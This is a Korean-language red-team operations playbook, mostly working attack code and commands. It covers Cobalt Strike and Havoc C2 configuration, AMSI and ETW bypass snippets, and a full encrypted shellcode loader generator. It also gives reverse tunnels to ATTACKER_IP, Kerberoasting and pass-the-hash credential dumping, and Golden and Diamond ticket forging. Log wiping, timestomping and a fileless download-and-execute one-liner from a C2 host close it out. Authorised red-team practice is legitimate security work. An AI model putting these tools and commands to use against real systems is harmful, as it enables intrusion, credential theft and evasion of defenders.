# 레드팀 운영 플레이북

## 레드팀 vs 펜테스트

```
침투 테스트 (Pentest)          레드팀 (Red Team)
─────────────────────────────────────────────────
범위: 특정 시스템/앱              범위: 전체 조직
시간: 수 일~수 주                시간: 수 주~수 개월
목표: 취약점 발견                목표: 탐지 우회 + 목표 달성
알림: 보안팀 대부분 인지         알림: 극소수만 인지 (화이트셀)
메트릭: 취약점 수                메트릭: 목표 달성 여부
팀: 보안팀 협력                  팀: 독립 작전
```

---

## 1. 레드팀 운영 구조

### 팀 구성

```
레드팀 리더 (Red Team Lead)
  │
  ├── 기술 운영자 (Operator)
  │     - 초기 접근/익스플로잇
  │     - 내부 이동
  │     
  ├── C2 운영자 (C2 Operator)
  │     - Cobalt Strike/Havoc 서버 운영
  │     - 비콘 관리
  │
  └── 인텔리전스 분석가
        - OSINT
        - 타겟 프로파일링
        - 사회공학 계획

화이트셀 (White Cell):
  - 규칙 통제
  - 비상 정지 권한
  - 블루팀 중재
```

### 운영 단계

```
1. 계획 (Planning)
   - 목표(Flag) 정의
   - 규칙(Rules of Engagement) 수립
   - OSINT 정찰

2. 초기 접근 (Initial Access)
   - 피싱 캠페인
   - 공개 취약점 익스플로잇
   - 물리적 접근

3. 실행 (Execution)
   - 페이로드 실행
   - 프로세스 인젝션

4. 지속성 (Persistence)
   - 자동 시작 메커니즘
   - 계정 생성

5. 권한 상승 (Privilege Escalation)
   - 로컬 → 도메인 관리자

6. 방어 우회 (Defense Evasion)
   - AV/EDR 우회
   - 로그 삭제

7. 자격증명 접근 (Credential Access)
   - Mimikatz
   - Kerberoasting

8. 발견 (Discovery)
   - 내부 네트워크 매핑
   - 민감 데이터 탐색

9. 수집 (Collection)
   - 데이터 압축
   - 스테이징

10. 목표 달성 (Impact/Exfiltration)
    - 데이터 유출
    - 비즈니스 시스템 접근
```

---

## 2. Cobalt Strike 핵심 운영

### 팀 서버 설정


Cobalt Strike는 전문 레드팀 시뮬레이션 도구로, Beacon C2 에이전트를 통해 타겟 시스템을 원격 제어합니다. HTTP/HTTPS/DNS 등 다양한 채널로 C2 통신을 우회하며, 실제 APT 공격 시뮬레이션에 사용됩니다.

```bash
# Cobalt Strike 팀 서버 시작
./teamserver SERVER_IP STRONG_PASSWORD malleable_profile.c2

# 클라이언트 연결
./cobaltstrike
# → 팀 서버 IP 및 비밀번호 입력

# Malleable C2 프로필 (탐지 우회)
# GET 요청처럼 보이는 C2 트래픽
```

### Malleable C2 프로필 작성

```
# jquery.c2 - jQuery처럼 위장
http-get {
    set uri "/jquery-3.3.1.min.js";
    
    client {
        header "Host" "cdn.jquery.com";
        header "Accept" "text/javascript";
        header "Referer" "https://www.google.com/";
        
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "text/javascript; charset=utf-8";
        header "Cache-Control" "max-age=3600";
        header "Server" "cloudflare";
        
        output {
            print;
        }
    }
}

http-post {
    set uri "/jquery-3.3.1.min.js";
    
    client {
        header "Host" "cdn.jquery.com";
        header "Content-Type" "application/javascript";
        
        id {
            base64url;
            append ".min.js";
            uri-append;
        }
        
        output {
            base64url;
            print;
        }
    }
    
    server {
        header "Content-Type" "text/javascript";
        output { print; }
    }
}

# 비콘 슬리프 설정 (탐지 회피)
set sleeptime "60000";      # 60초 기본 슬리프
set jitter "20";             # 20% 랜덤 지터
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
```

### Cobalt Strike 핵심 명령어

Cobalt Strike C2 프레임워크의 핵심 명령어입니다. 비콘 관리, 측면 이동, 자격증명 수집 등 레드팀 작전의 모든 단계를 지원합니다.

```bash
# 비콘 관리
beacon> help                    # 도움말
beacon> sleep 0                 # 즉시 응답 (적극적)
beacon> sleep 300 20            # 5분 슬리프 + 20% 지터 (은밀)

# 정찰
beacon> whoami                  # 현재 사용자
beacon> getuid                  # 현재 유저 ID
beacon> ps                      # 프로세스 목록
beacon> net computers           # 도메인 컴퓨터
beacon> net localgroup          # 로컬 그룹
beacon> net user /domain        # 도메인 사용자

# 자격증명
beacon> logonpasswords          # Mimikatz logonpasswords
beacon> dcsync DOMAIN\ACCOUNT   # DC Sync (관리자)
beacon> kerberos_ticket_use /tmp/ticket.kirbi  # 티켓 사용

# 수평 이동
beacon> jump psexec TARGET LISTENER
beacon> jump winrm TARGET LISTENER
beacon> remote-exec wmi TARGET cmd /c whoami

# 권한 상승
beacon> getsystem              # 로컬 권한 상승 시도
beacon> runasadmin             # UAC 우회

# 데이터 수집
beacon> download C:\sensitive\file.txt
beacon> screenshot              # 스크린샷
beacon> keylogger               # 키로거
beacon> browserpivot PID        # 브라우저 피벗

# 피벗
beacon> socks 1080              # SOCKS4 프록시
beacon> socks5 1080 socks_user pass  # SOCKS5
beacon> covertvpn               # VPN 피벗
```

---

## 3. Havoc C2 프레임워크 (오픈소스)

Havoc는 오픈소스 C2 프레임워크입니다. Cobalt Strike의 오픈소스 대안으로 팀 서버와 에이전트 간 암호화 통신을 제공합니다.

```bash
# Havoc 설치
git clone https://github.com/HavocFramework/Havoc
cd Havoc
make ts-build   # 팀 서버 빌드
make client-build  # 클라이언트 빌드

# 팀 서버 시작
./havoc server --profile ./profiles/havoc.yaotl

# YAOTL 프로필 예시
Teamserver {
    Host = "0.0.0.0"
    Port = 40056
    Build {
        Compiler64 = "x86_64-w64-mingw32-gcc"
    }
}

Operators {
    operator "operator1" {
        Password = "StrongPass123!"
    }
}

Listeners {
    Http {
        Name = "https80"
        Hosts = ["attacker.com"]
        Port = 443
        Ssl = true
        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        Uris = ["/jquery.min.js", "/bootstrap.css"]
    }
}
```

---

## 4. AV/EDR 우회 기법

### AMSI (Anti-Malware Scan Interface) 우회

AMSI(Anti-Malware Scan Interface) 우회 기법입니다. PowerShell 스크립트가 실행 전에 AMSI로 검사되는 것을 Reflection 기반으로 패치하여 우회합니다.

```powershell
# AMSI 패치 (Reflection 기반)
$a=[Ref].Assembly.GetTypes()
foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static')
foreach($e in $d){if($e.Name -like "*Context"){$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# AMSI 우회 - 오류 강제 발생
[Runtime.InteropServices.Marshal]::WriteByte(
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
        'amsiInitFailed','NonPublic,Static').GetValue($null), 1
)
```

### ETW (Event Tracing for Windows) 우회

ETW(Event Tracing for Windows) 비활성화 코드입니다. ETW는 프로세스 활동을 기록하므로 탐지 회피를 위해 악성코드가 비활성화를 시도합니다.

```csharp
// ETW 비활성화 (프로세스 내)
using System.Runtime.InteropServices;

[DllImport("ntdll.dll")]
static extern int NtSetInformationProcess(
    IntPtr ProcessHandle, 
    int ProcessInformationClass,
    ref int ProcessInformation, 
    int ProcessInformationLength);

// ETW 비활성화
int flag = 0;
NtSetInformationProcess(
    (IntPtr)(-1),   // 현재 프로세스
    0x1D,           // ProcessDisableUserModeCallbackFilter
    ref flag, 
    sizeof(int));
```

### 프로세스 인젝션 기법

고전적인 프로세스 인젝션 기법입니다. VirtualAllocEx로 원격 프로세스에 메모리를 할당하고 WriteProcessMemory로 셸코드를 주입합니다.

```csharp
// 고전적: VirtualAllocEx + WriteProcessMemory
// → 탐지됨

// 개선: Process Hollowing
// 1. 정상 프로세스 Suspend 상태로 생성
// 2. 메모리 언맵핑
// 3. 악성 코드 맵핑
// 4. Resume

// 더 개선: Thread Hijacking (현존 스레드 활용)
// 1. OpenThread
// 2. SuspendThread
// 3. GetThreadContext
// 4. VirtualAllocEx + Write shellcode
// 5. SetThreadContext (RIP/EIP 변경)
// 6. ResumeThread

// 최신: Direct Syscall (API 훅킹 우회)
// NTDLL 훅을 피해 직접 syscall 번호 호출
```

### Shellcode 난독화

셸코드를 난독화하여 AV/EDR 탐지를 우회합니다. XOR 암호화, Base64 인코딩, 커스텀 인코딩으로 시그니처 기반 탐지를 피합니다.

```python
#!/usr/bin/env python3
"""
Shellcode 암호화 및 C#/Python 로더 생성 CLI (AES-256-GCM 사용)
사용: python3 shellcode_encrypt.py encrypt --input shellcode.bin --output loader.cs --lang csharp
      python3 shellcode_encrypt.py encrypt --input shellcode.bin --output loader.py  --lang python
      python3 shellcode_encrypt.py encrypt --input shellcode.bin --hex-only
"""

from __future__ import annotations
import argparse
import os
import sys
from pathlib import Path

try:
    from Crypto.Cipher import AES
except ImportError:
    print("[-] pycryptodome 필요: pip install pycryptodome", file=sys.stderr)
    sys.exit(1)


def encrypt_shellcode_gcm(shellcode: bytes) -> tuple[bytes, bytes, bytes, bytes]:
    """
    AES-256-GCM으로 shellcode 암호화 (AEAD — 무결성 검증 포함)
    반환: (key, nonce, ciphertext, tag)
    """
    key   = os.urandom(32)   # 256-bit
    nonce = os.urandom(12)   # 96-bit GCM 권장
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(shellcode)
    return key, nonce, ciphertext, tag


def hex_array(data: bytes, var: str, indent: int = 8) -> str:
    pad = " " * indent
    hex_vals = ", ".join(f"0x{b:02x}" for b in data)
    return f"{pad}byte[] {var} = {{ {hex_vals} }};"


def generate_csharp_loader(key: bytes, nonce: bytes,
                            ct: bytes, tag: bytes) -> str:
    """AES-256-GCM C# 로더 — BouncyCastle 또는 .NET 내장 AesGcm 사용"""
    return f"""\
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

// 빌드: csc /optimize+ /unsafe loader.cs
class Loader {{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f,
        IntPtr p, uint c, IntPtr id);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr h, uint ms);

    static void Main() {{
{hex_array(key,   "key")}
{hex_array(nonce, "nonce")}
{hex_array(ct,    "ciphertext")}
{hex_array(tag,   "tag")}

        byte[] shellcode = new byte[ciphertext.Length];

        // AES-256-GCM 복호화 + 인증 (.NET 5+)
        using (var gcm = new AesGcm(key, 16)) {{
            gcm.Decrypt(nonce, ciphertext, tag, shellcode);
        }}

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
            0x3000, 0x40);  // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        var t = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }}
}}
"""


def generate_python_loader(key: bytes, nonce: bytes,
                            ct: bytes, tag: bytes) -> str:
    """AES-256-GCM Python 로더 (ctypes 기반, Windows 전용)"""
    return f"""\
#!/usr/bin/env python3
\"\"\"AES-256-GCM Python 셸코드 로더 — Windows 전용 (ctypes)\"\"\"
import ctypes, sys

try:
    from Crypto.Cipher import AES
except ImportError:
    sys.exit("pip install pycryptodome")

KEY   = bytes.fromhex("{key.hex()}")
NONCE = bytes.fromhex("{nonce.hex()}")
CT    = bytes.fromhex("{ct.hex()}")
TAG   = bytes.fromhex("{tag.hex()}")

cipher = AES.new(KEY, AES.MODE_GCM, nonce=NONCE)
shellcode = cipher.decrypt_and_verify(CT, TAG)

MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXEC_RW = 0x40

k32 = ctypes.windll.kernel32
addr = k32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXEC_RW)
ctypes.memmove(addr, shellcode, len(shellcode))
h = k32.CreateThread(None, 0, addr, None, 0, None)
k32.WaitForSingleObject(h, -1)
"""


def main() -> None:
    parser = argparse.ArgumentParser(description="Shellcode 암호화 로더 생성")
    sub = parser.add_subparsers(dest="cmd", required=True)

    enc = sub.add_parser("encrypt", help="shellcode 암호화 후 로더 생성")
    enc.add_argument("--input",  type=Path, required=True, help="shellcode 바이너리")
    enc.add_argument("--output", type=Path, help="출력 파일")
    enc.add_argument("--lang",   choices=["csharp", "python"], default="csharp")
    enc.add_argument("--hex-only", action="store_true",
                     help="로더 생성 없이 key/nonce/ct/tag 만 출력")

    args = parser.parse_args()

    if args.cmd == "encrypt":
        raw = args.input.read_bytes()
        key, nonce, ct, tag = encrypt_shellcode_gcm(raw)
        print(f"[*] shellcode: {len(raw)} bytes → {len(ct)} bytes (암호화)")
        print(f"    key   : {key.hex()}")
        print(f"    nonce : {nonce.hex()}")
        print(f"    tag   : {tag.hex()}")

        if args.hex_only:
            return

        if args.lang == "csharp":
            code = generate_csharp_loader(key, nonce, ct, tag)
        else:
            code = generate_python_loader(key, nonce, ct, tag)

        if args.output:
            args.output.write_text(code)
            print(f"[+] 로더 저장: {args.output}")
        else:
            print(code)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        # 데모: NOP sled 암호화
        dummy = b"\x90" * 64 + b"\xcc"   # NOP sled + INT3
        k, n, c, t = encrypt_shellcode_gcm(dummy)
        print(f"[Demo] {len(dummy)}B shellcode 암호화 완료")
        print(f"  key={k.hex()}\n  nonce={n.hex()}\n  tag={t.hex()}")
    else:
        main()
```

---

## 5. 내부 네트워크 피벗

### SOCKS 프록시를 통한 피벗

chisel 도구로 SOCKS 프록시 터널을 구성하여 피벗합니다. 내부 네트워크의 비공개 서비스에 외부에서 접근하기 위해 사용합니다.

```bash
# ── chisel SOCKS 터널 ──────────────────────────────────────
# 공격자 서버 (리버스 SOCKS5)
./chisel server -p 8080 --reverse --socks5

# 피해자 시스템 (에이전트)
./chisel client ATTACKER_IP:8080 R:1080:socks

# proxychains 설정
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 22,80,443,445,3389 192.168.10.0/24

# ── Impacket 내부 망 정찰 (proxychains 경유) ──────────────
# 도메인 내 사용자 열거
proxychains impacket-GetADUsers -all DOMAIN/USER:PASS -dc-ip 192.168.10.1

# Kerberoasting (SPN 서비스 계정 해시 수집)
proxychains impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip 192.168.10.1 \
    -request -outputfile kerberoast.txt

# hashcat으로 TGS 해시 크래킹
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule

# AS-REP Roasting (사전 인증 비활성 계정)
proxychains impacket-GetNPUsers DOMAIN/ -usersfile users.txt \
    -format hashcat -outputfile asrep.txt -dc-ip 192.168.10.1
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# secretsdump — 원격 자격증명 덤프
proxychains impacket-secretsdump DOMAIN/Administrator:PASS@192.168.10.5
# Pass-the-Hash 방식
proxychains impacket-secretsdump -hashes ':NTLM_HASH' \
    DOMAIN/Administrator@192.168.10.5

# PSExec — 관리자 쉘 획득
proxychains impacket-psexec -hashes ':NTLM_HASH' \
    DOMAIN/Administrator@192.168.10.5 cmd.exe

# WMI 원격 실행
proxychains impacket-wmiexec -hashes ':NTLM_HASH' \
    DOMAIN/Administrator@192.168.10.5 'whoami /all'

# ── Ligolo-ng (고성능 피벗) ────────────────────────────────
# 공격자 (프록시 서버)
./proxy -selfcert -laddr 0.0.0.0:11601

# 피해자 (에이전트)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# 공격자 프록시에서 터널 시작
ligolo-ng >> session                    # 세션 선택
ligolo-ng >> tunnel_start --tun ligolo  # 터널 활성화
# 라우팅 추가
sudo ip route add 192.168.10.0/24 dev ligolo
```

### 더블 피벗 (두 단계 중간 시스템)

두 단계의 중간 시스템을 거치는 다중 피벗 기법입니다. 격리된 내부 세그먼트에 접근하거나 공격 경로를 추적하기 어렵게 만듭니다.

```bash
# 인터넷 → 에지 서버 → 내부 서버 → 격리 서버
# 공격자 → Pivot1 → Pivot2 → Target

# 1단계: Pivot1 접근
ssh user@EDGE_SERVER

# 2단계: Pivot1에서 Pivot2로 터널
# Pivot1에서:
ssh -L 2222:INTERNAL_SERVER:22 -N user@INTERNAL_SERVER &
ssh -D 1080 -N -p 2222 user@127.0.0.1

# 공격자에서:
proxychains nmap -sT INTERNAL_NETWORK/24
```

---

## 6. 도메인 지속성

### Golden Ticket

krbtgt 계정 해시로 골든 티켓을 생성하여 도메인 내 모든 서비스에 접근합니다. 도메인 컨트롤러 완전 장악 후 지속성 확보에 사용됩니다.

```bash
# 1. krbtgt 해시 획득
mimikatz# lsadump::dcsync /user:krbtgt /domain:company.local
# → NTLM Hash: aabbcc...

# 2. Golden Ticket 생성
mimikatz# kerberos::golden \
    /domain:company.local \
    /sid:S-1-5-21-XXXXXXXXXX \
    /krbtgt:KRBTGT_NTLM_HASH \
    /user:Administrator \
    /groups:512,513,518,519,520 \
    /ticket:golden.kirbi

# 3. 티켓 사용
mimikatz# kerberos::ptt golden.kirbi

# 또는 Pass-the-Ticket
Rubeus.exe ptt /ticket:golden.kirbi

# Golden Ticket으로 도메인 내 모든 서비스 접근
klist  # 티켓 확인
dir \\DC01\C$  # DC 파일 시스템 접근
```

### Diamond Ticket (탐지 우회 개선)

다이아몬드 티켓은 합법적인 TGT를 수정하는 방식으로 골든 티켓보다 탐지가 어렵습니다. 정상적인 Kerberos 교환을 기반으로 하여 이상 탐지를 우회합니다.

```bash
# Rubeus Diamond Ticket 생성 (합법적 TGT + 수정)
Rubeus.exe diamond \
    /tgtdeleg \
    /ticketuser:user@company.com \
    /ticketuserid:1234 \
    /groups:512 \
    /krbkey:AES256_KEY \
    /nowrap
```

---

## 7. MITRE ATT&CK 프레임워크 매핑

### ATT&CK 매트릭스 개요
```
전술 (Tactic) → 기법 (Technique) → 절차 (Procedure)

주요 전술 14개:
  TA0043 Reconnaissance      → 정찰
  TA0042 Resource Development → 자원 개발
  TA0001 Initial Access       → 초기 접근
  TA0002 Execution            → 실행
  TA0003 Persistence          → 지속성
  TA0004 Privilege Escalation → 권한 상승
  TA0005 Defense Evasion      → 방어 우회
  TA0006 Credential Access    → 자격증명 접근
  TA0007 Discovery            → 발견
  TA0008 Lateral Movement     → 측면 이동
  TA0009 Collection           → 수집
  TA0011 Command and Control  → C2
  TA0010 Exfiltration         → 유출
  TA0040 Impact               → 영향
```

### 레드팀 작전과 ATT&CK 매핑 예시
```
초기 접근 (T1566 Phishing)
  └─→ 실행 (T1059 Command and Script Interpreter)
        └─→ 지속성 (T1053 Scheduled Task/Job)
              └─→ 권한 상승 (T1055 Process Injection)
                    └─→ 자격증명 접근 (T1003 OS Credential Dumping)
                          └─→ 측면 이동 (T1550 Pass the Hash)
                                └─→ 유출 (T1048 Exfiltration Over Alternative Protocol)
```

### 주요 기법별 탐지 회피 전략

MITRE ATT&CK 기법별 탐지 회피 전략입니다. PowerShell, WMI, 서비스 등 주요 공격 기술에 대한 우회 방법을 다룹니다.

```bash
# T1059.001 PowerShell 탐지 우회
# AMSI 우회 + ETW 비활성화 후 실행
powershell -w hidden -ep bypass -enc <BASE64>

# T1003.001 LSASS 덤프 탐지 우회
# 직접 LSASS 접근 대신 VSS 활용
# 또는 MiniDumpWriteDump API 대신 NtReadVirtualMemory 직접 호출

# T1070.001 이벤트 로그 삭제 탐지
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
# 단, 로그 삭제 자체가 이벤트 ID 1102로 기록됨 → 주의

# T1027 난독화
# 인코딩, 암호화, 패킹 등으로 정적 분석 우회
```

---

## 8. 레드팀 보고서 구조

레드팀 운영 결과를 전달하는 최종 보고서 구조입니다. 경영진 요약, 기술적 발견사항, 위험도 평가, 개선 권고안을 포함합니다.

```markdown
# 레드팀 최종 보고서

## 이사회 요약 (Executive Summary)
- 작전 기간: 2024-01-15 ~ 2024-02-15
- 목표 달성: 3/5개 (60%)
- 탐지 회피: 블루팀이 14일 동안 미탐지
- 핵심 위험: 피싱 → 도메인 장악 체인

## 목표 달성 현황
| 목표 | 결과 | 소요 시간 |
|------|------|----------|
| 도메인 관리자 획득 | ✓ 달성 | 3일 |
| 재무 시스템 접근 | ✓ 달성 | 7일 |
| 고객 DB 접근 | ✓ 달성 | 10일 |
| 물리적 서버실 접근 | ✗ 미달성 | - |
| 임원 이메일 접근 | ✓ 달성 | 12일 |

## 공격 체인 (Attack Chain)
초기 접근 → 권한 상승 → 내부 이동 → 목표 달성

## 주요 발견 사항
### Critical
1. 피싱 인식 부재 (클릭률 43%)
2. EDR 커버리지 갭 (3개 서버 미설치)
3. 크리덴셜 재사용 (AD 사용자의 68%)

## 블루팀 탐지 현황
- 14일간 미탐지
- 최초 탐지: 1월 29일 (EDR 알림)
- 탐지 계기: 비정상적 LSASS 접근

## 개선 권고사항
Priority 1 (즉시):
  - 피싱 훈련 강화
  - EDR 전 시스템 배포
  - 특권 계정 MFA 적용

Priority 2 (30일 내):
  - Tier 모델 (관리자/일반 분리)
  - Privileged Access Workstation
  - 네트워크 분리 강화
```

---

## 9. 물리적 레드팀 기법

### 사회공학 (Social Engineering)
```
스피어 피싱 캠페인 준비:
  1. OSINT로 표적 직원 프로파일링
     - LinkedIn, 회사 홈페이지, SNS
  2. 신뢰할 수 있는 발신자 위장
     - 동료, 협력사, IT 팀
  3. 상황에 맞는 미끼 (Lure) 제작
     - 인사 발령, 급여명세서, 청구서
  4. 페이로드 포함 문서 또는 링크
     - 매크로 포함 Word/Excel
     - HTML Smuggling
     - ISO/ZIP 파일 (MOTW 우회)

Vishing (전화 사기):
  - IT 지원팀 위장 비밀번호 요청
  - 긴급 상황 연출 (심리적 압박)

Baiting (미끼):
  - USB 드롭 공격 (주차장, 로비)
  - 악성 USB에 자동실행 페이로드
```

### 물리적 접근
```
건물 침투 방법:
  1. Tailgating — 직원 뒤에 따라 들어가기
  2. 택배기사/수리기사 위장
  3. 잠금 픽킹 (Lock Picking)
  4. 리더기 클로닝 (RFID/NFC 카드)

내부 접근 후:
  - RJ45 탭 또는 Wi-Fi 펌프킨으로 트래픽 캡처
  - USB Rubber Ducky로 빠른 페이로드 실행
  - LAN Turtle — 인라인 네트워크 임플란트
```

---

## 10. 레드팀 운영 보안 (OPSEC)

### 인프라 구성
```
레드팀 인프라 (레이어드 구조):

인터넷
  │
  ├── 리다이렉터 (Redirector)
  │     - 클라우드 VPS (AWS/Azure/GCP)
  │     - 실제 C2 IP 숨김
  │     - Apache/Nginx mod_rewrite
  │
  └── C2 서버 (팀 서버)
        - VPN으로만 접속
        - 공개 IP 없음
        - 로그 암호화 보관
```

### 도메인 프론팅 및 CDN 악용

도메인 프론팅으로 C2 통신을 CDN 뒤에 숨깁니다. 합법적인 도메인을 앞에 내세워 네트워크 탐지를 우회하지만 현재 대부분의 CDN에서 차단됩니다.

```bash
# CloudFront 도메인 프론팅 (현재 대부분 차단됨)
# 대안: CDN 제공사의 합법적 도메인 뒤에 C2 숨기기

# 합법적으로 보이는 도메인 등록
# - typosquatting: micosoft.com, googgle.com
# - 카테고리화 우선: news, sports, cdn 관련 도메인
# - 오래된 도메인 구매 (Domain Age 우선)

# 도메인 신뢰도 확인
curl "https://www.virustotal.com/vtapi/v2/domain/report?domain=DOMAIN&apikey=API_KEY"
```

### 흔적 최소화

작전 종료 후 공격 흔적을 지우는 방법입니다. 타임스탬프 조작, 로그 삭제, 도구 제거 등으로 사후 포렌식 분석을 어렵게 합니다.

```bash
# 타임스탬프 조작
touch -t 202001010000 malicious.exe    # 타임스탬프 변경
touch -r legit.dll malicious.dll       # 합법 파일의 타임스탬프 복사

# 메모리에서만 실행 (파일리스 공격)
# PowerShell IEX (다운로드 및 메모리 실행)
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"

# 로그 삭제 (탐지 위험 있음)
# Windows
wevtutil cl Security
# Linux
> /var/log/auth.log    # 파일 내용 비우기 (삭제보다 덜 눈에 띔)
```
